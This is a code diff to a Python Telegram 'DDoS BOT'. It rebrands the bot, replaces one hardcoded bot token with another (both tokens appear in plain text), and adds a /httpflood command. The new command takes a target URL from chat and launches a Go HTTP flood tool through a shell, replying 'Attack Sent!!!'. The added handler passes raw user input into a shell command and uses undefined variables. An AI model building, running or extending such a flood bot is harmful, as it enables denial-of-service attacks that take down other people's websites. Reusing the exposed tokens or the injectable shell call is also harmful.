@@ -17,17 +17,18 @@ import subprocess
 import concurrent.futures
 import random, datetime, telegram    
 
+#Belum Di Ganti
 #Telegram token
-token = os.getenv('token', '6374420997:AAFSiANqFzW6xsVMTrck4izax8Y-ErS7sto')
-bot_number = os.getenv('bot_number', '999999999')
-methods = ['methods', '/httpfspoof', '/help', 'start'] # Methods
+token = os.getenv('token', '6089823056:AAFU5xPyeGZZSbMoaJk3Z-JbFSIVgpXIeLg')
+bot_number = os.getenv('bot_number', '6089823056')
+methods = ['methods', '/httpfspoof', '/help', 'start', '/httpflood'] # Methods
 updater = Updater(token, use_context = True)
 s = 50,000
 t = 50000
 
 
 def start(update: Update, context: CallbackContext):
-  update.message.reply_text(f"Welcome To ⊂🚀⊃  Xlients DDoS BOT  ⊂🚀⊃ \nUser Slash Command\n\nNeed Help? Pv @xlients")
+  update.message.reply_text(f"Welcome To ⊂🚀⊃  Yura DDoS BOT  ⊂🚀⊃ \nUser Slash Command\n\nNeed Help? Pv @fengzzt")
 
 
 def tmps(update: Update, context: CallbackContext):
@@ -41,10 +42,11 @@ def help(update: Update, context: CallbackContext):
    🚀 𝙈𝙀𝙏𝙃𝙊𝘿𝙎 🚀
 ═════════════════
 /httpfspoof [𝙪𝙧𝙡] [𝙩𝙞𝙢𝙚] [𝙩𝙝𝙧𝙚𝙖𝙙] ( Free For Anyone HTTPS/2.0 ) 
+/httpflood [url] [threads] [method] [time]
 
 𝚔𝚊𝚖𝚒 𝚊𝚔𝚊𝚗 𝚖𝚎𝚗𝚊𝚖𝚋𝚊𝚑𝚔𝚊𝚗 𝚕𝚎𝚋𝚒𝚑 𝚋𝚊𝚗𝚢𝚊𝚔 𝚖𝚎𝚝𝚑𝚘𝚍𝚜
 
-@xlients
+@fengzzt
 
             ''')
 
@@ -71,6 +73,29 @@ def httpfspoof(update: Update, context: CallbackContext):
         disable_web_page_preview=True,
         parse_mode='HTML'
       )
+      
+def httpflood(update: Update, context: CallbackContext):
+  url = update.message.text.replace('/httpflood', '')
+  update.message.reply_text(f"Attack Sent!!!")
+  url_str = str(url)
+  print(url_str)
+  p = subprocess.Popen(f'go run httpflood.go httpflood.go {url} {thread} {method} {time}', stdout=subprocess.PIPE, shell=True)
+  output, error = p.communicate()
+  if error:
+    update.message.reply_text(f'You Have Exceeded Your Maximum Concurrents!')
+  else:
+     # Divise l'output en plusieurs parties
+    parts = output.decode().split('\n')
+
+    # Envoie chaque partie de l'output au chat
+    for part in parts:
+      chat_id = str(update.effective_user.id)
+      update.message.bot.send_message(
+        chat_id = chat_id,
+        text=part,
+        disable_web_page_preview=True,
+        parse_mode='HTML'
+      )
             
 
 
@@ -81,6 +106,7 @@ updater.dispatcher.add_handler(CommandHandler('/httpfspoof', httpfspoof))
 updater.dispatcher.add_handler(CommandHandler('start', start))
 updater.dispatcher.add_handler(CommandHandler('/help', help))
 updater.dispatcher.add_handler(CommandHandler('/httpfspoof', httpfspoof))
+updater.dispatcher.add_handler(CommandHandler('/httpflood', httpflood))
 #Run the bot
 updater.start_polling()
 
